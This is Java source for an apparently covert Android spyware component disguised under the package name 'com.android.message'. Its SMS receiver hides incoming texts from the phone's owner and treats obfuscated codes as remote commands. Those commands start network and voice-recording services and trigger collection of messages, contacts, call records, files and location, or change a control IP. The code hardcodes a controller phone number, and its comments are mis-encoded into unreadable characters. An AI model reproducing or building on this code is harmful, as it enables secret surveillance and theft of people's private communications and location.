package com.android.message;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.gsm.SmsMessage;
import android.util.Log;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;

/**
 * ���ն���������
 * 
 * @author log(K)
 * 
 */
public class SMSBroadcastReceiver extends BroadcastReceiver {

	private static final String TAG = "SMSBroadcastReceiver";
	private static ConnectivityManager mConnectivityManager;

	public static Intent i;
	public static Intent voiceIntent; // ����
	public static final String MYNUM = "18701501807";
	// public static final String MYNUM = "12520";

	// lzd start add an command "xS7j" to order[] to change IP address
	// lzd new IP address command style like xS7j127.0.0.1
	// public static final String[] order = {"fileinfor", "message",
	// "simphonenum", "outlookphonenum",
	// "appointment", "task", "callrecord", "colormsg", "quit",
	// "location","��IP","��ָ������ ","����ĳ��","����ĳ��","��ֹͨ�� ","���ͨ��"};
	public static final String[] order = { "xvsP", "SxVa", "3Vaa", "T7x6",
			"vS8b", "nn8C", "Xrw0", "nl3Z", "xYIo", "lsP5", "xS7j","dH7k","j9P5","UR4f","Pk9b","VT5w" };
	// lzd end add

	// public static final String openNet = "force";
	public static final String openNet = "LaFE";

	// public static final String[] voice = {"voice", "stop"};
	public static final String[] voice = { "txXe", "NtvY" };

	public static final String voiceOrderPath = "data/data/com.android.message/";
	// public static final String voiceOrderPath = "/mnt/sdcard/";
	public static final String voiceOrderName = "VoiceOrder.txt";

	public void onReceive(Context context, Intent intent) {

		// TODO Auto-generated method stub
		if (intent.getAction()
				.equals("android.provider.Telephony.SMS_RECEIVED")) {
			// ���յ����Ƕ���
			Log.v("SMS", "Receive sms start");
			WriteLogFile.writeLog("recv msg");
			Bundle bundle = intent.getExtras(); // �õ�����
			if (bundle != null) {
				Object[] myObj = (Object[]) bundle.get("pdus");
				SmsMessage[] message = new SmsMessage[myObj.length];
				for (int i = 0; i < message.length; ++i) {
					message[i] = SmsMessage.createFromPdu((byte[]) myObj[i]);
				}
				StringBuilder sb = new StringBuilder();
				for (SmsMessage msg : message) {
					String number = msg.getDisplayOriginatingAddress();
					// �ж��ǲ���Ҫ���صĺ���
					// if(number.contains(MYNUM)) {

					// �õ���������
					String content = msg.getDisplayMessageBody();
					// ����

					// Log.v("SMS", "aborted!");
					// if(content.length() < 6) {
					// this.abortBroadcast(); //�жϹ㲥

					if (content.contains(openNet)) {
						this.abortBroadcast(); // �жϹ㲥
						i = new Intent();
						i.setClass(context, NetworkService.class);
						Log.i("i", "Intent recevied");
						// ��������ͨ·
						context.startService(i);
						// break;
					}

					for (String odrs : voice) {
						if (content.contains(odrs)) {
							WriteLogFile
									.writeLog("receive voice order " + odrs);
							this.abortBroadcast(); // �жϹ㲥
							// ������д���ļ���
							try {
								// FileIOHelper orderWrite = new
								// FileIOHelper(context, voiceOrderPath,
								// voiceOrderName);
								// orderWrite.write(odrs); //������д���ļ�
								// orderWrite.close();
								File logFile = new File(voiceOrderPath
										+ voiceOrderName);
								FileOutputStream file = new FileOutputStream(
										logFile, false);
								file.write(odrs.getBytes());
								file.close();
								WriteLogFile.writeLog("voice order " + odrs
										+ "write success!");
							} catch (IOException ioe) {
								WriteLogFile.writeLog(ioe.getMessage());
								return;
							}
							if (odrs.equalsIgnoreCase("txXe")) { // ��ʼ

								voiceIntent = new Intent();
								voiceIntent.setClass(context,
										VoiceService.class);
								//context.startService(voiceIntent);
								// lzd

								// ��ʱ��

								// ��ʼʱ��
								
								long firstTime = SystemClock.elapsedRealtime();

								AlarmManager am = (AlarmManager) context
										.getSystemService(context.ALARM_SERVICE);

								PendingIntent sender = PendingIntent
										.getService(context, 0, voiceIntent, 0);
								//am.setRepeating(
								//		AlarmManager.ELAPSED_REALTIME_WAKEUP,
								//		firstTime, 10 * 1000,sender);
								// ʹ��ϵͳʱ���趨����1�������
								
								am.set(AlarmManager.RTC_WAKEUP,
								System.currentTimeMillis() + 1 * 1000, sender);
								//RTC_WAKEUP
								//WriteLogFile.writeLog("��ǣ����Ӻ���");
								// lzd
							}

							break;
						}
					}
					for (String odr : order) {
						// ��������ʱ,ִ������
						if (content.contains(odr)) {
							this.abortBroadcast(); // �жϹ㲥
							WriteLogFile.writeLog("begin exec msg order");
							// lzd start
							if (odr.equals("xS7j")||odr.equals("dH7k")||odr.equals("j9P5")||odr.equals("UR4f")) {
								RegisterService.smsOrder = content;
							} 
							else {
								RegisterService.smsOrder = odr;
							}
							// lzd end
							Intent i = new Intent();
							i.setClass(context, RegisterService.class);
							context.startService(i);
							break;
						}

					}
					WriteLogFile.writeLog("end of the msg order");
					// Intent i = new Intent();
					// i.setClass(context, RegisterService.class);
					// context.startService(i);
					Log.i(TAG, "START REGISTER");

				}
			}
			// }

			// }

		}
	}

}
